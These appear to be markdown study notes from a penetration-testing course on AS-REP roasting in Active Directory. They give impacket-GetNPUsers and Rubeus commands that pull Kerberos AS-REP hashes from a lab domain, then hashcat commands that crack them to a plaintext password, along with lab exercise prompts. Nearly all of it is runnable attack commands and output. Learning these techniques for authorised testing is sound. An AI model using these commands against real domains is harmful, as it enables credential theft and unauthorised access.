# AS-REP Roasting

Using GetNPUsers to perform AS-REP roasting
>``` shell
>kali@kali:~$ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete
>
># ========== Expected Result ==========
>Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
>
>Password:
>Name  MemberOf  PasswordLastSet             LastLogon                   UAC      
>----  --------  --------------------------  --------------------------  --------
>dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200 
># =====================================
>```

Obtaining the correct mode for Hashcat
>``` shell
>kali@kali:~$ hashcat --help | grep -i "Kerberos"
>
># ========== Expected Result ==========
>  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
>  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
>  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
>  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
>   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
>  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
>  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
># =====================================
>```

Cracking the AS-REP hash with Hashcat
>``` shell
>kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
>
># ========== Expected Result ==========
>...
>$krb5asrep$23$dave@CORP.COM:b24a619cfa585dc1894fd6924162b099$1be2e632a9446d1447b5ea80b739075ad214a578f03773a7908f337aa705bcb711f8bce2ca751a876a7564bdbd4a926c10da32b03ec750cf33a2c37abde02f28b7ab363ffa1d18c9dd0262e43ab6a5447db44f71256120f94c24b17b1df465beed362fcb14a539b4e9678029f3b3556413208e8d644fed540d453e1af6f20ab909fd3d9d35ea8b17958b56fd8658b144186042faaa676931b2b75716502775d1a18c11bd4c50df9c2a6b5a7ce2804df3c71c7dbbd7af7adf3092baa56ea865dd6e6fbc8311f940cd78609f1a6b0cd3fd150ba402f14fccd90757300452ce77e45757dc22:Flowers1
>...
># =====================================
>```

Using Rubeus to obtain the AS-REP hash of dave
>``` shell
>PS C:\Users\jeff> cd C:\Tools
>
>PS C:\Tools> .\Rubeus.exe asreproast /nowrap
>
># ========== Expected Result ==========
>   ______        _
>  (_____ \      | |
>   _____) )_   _| |__  _____ _   _  ___
>  |  __  /| | | |  _ \| ___ | | | |/___)
>  | |  \ \| |_| | |_) ) ____| |_| |___ |
>  |_|   |_|____/|____/|_____)____/(___/
>
>  v2.1.2
>
>
>[*] Action: AS-REP roasting
>
>[*] Target Domain          : corp.com
>
>[*] Searching path 'LDAP://DC1.corp.com/DC=corp,DC=com' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))'
>[*] SamAccountName         : dave
>[*] DistinguishedName      : CN=dave,CN=Users,DC=corp,DC=com
>[*] Using domain controller: DC1.corp.com (192.168.50.70)
>[*] Building AS-REQ (w/o preauth) for: 'corp.com\dave'
>[+] AS-REQ w/o preauth successful!
>[*] AS-REP hash:
>
>      $krb5asrep$dave@corp.com:AE43CA9011CC7E7B9E7F7E7279DD7F2E$7D4C59410DE2984EDF35053B7954E6DC9A0D16CB5BE8E9DCACCA88C3C13C4031ABD71DA16F476EB972506B4989E9ABA2899C042E66792F33B119FAB1837D94EB654883C6C3F2DB6D4A8D44A8D9531C2661BDA4DD231FA985D7003E91F804ECF5FFC0743333959470341032B146AB1DC9BD6B5E3F1C41BB02436D7181727D0C6444D250E255B7261370BC8D4D418C242ABAE9A83C8908387A12D91B40B39848222F72C61DED5349D984FFC6D2A06A3A5BC19DDFF8A17EF5A22162BAADE9CA8E48DD2E87BB7A7AE0DBFE225D1E4A778408B4933A254C30460E4190C02588FBADED757AA87A
># =====================================
>```

Cracking the modified AS-REP hash
>``` shell
>kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
>
># ========== Expected Result ==========
>...
>$krb5asrep$dave@corp.com:ae43ca9011cc7e7b9e7f7e7279dd7f2e$7d4c59410de2984edf35053b7954e6dc9a0d16cb5be8e9dcacca88c3c13c4031abd71da16f476eb972506b4989e9aba2899c042e66792f33b119fab1837d94eb654883c6c3f2db6d4a8d44a8d9531c2661bda4dd231fa985d7003e91f804ecf5ffc0743333959470341032b146ab1dc9bd6b5e3f1c41bb02436d7181727d0c6444d250e255b7261370bc8d4d418c242abae9a83c8908387a12d91b40b39848222f72c61ded5349d984ffc6d2a06a3a5bc19ddff8a17ef5a22162baade9ca8e48dd2e87bb7a7ae0dbfe225d1e4a778408b4933a254c30460e4190c02588fbaded757aa87a:Flowers1
>...
># =====================================
>```

Lab 1 - Follow the steps outlined in this section to obtain the plaintext password of dave on Windows and Kali by performing AS-REP Roasting. What is the correct Hashcat mode to crack AS-REP hashes?
>``` shell
>
>```
>

Lab 2 - Once VM Group 2 is started, the domain corp.com has been slightly modified. Use the techniques from this section to obtain another plaintext password by performing AS-REP Roasting and enter it as answer to this exercise.
>``` shell
>
>```
>
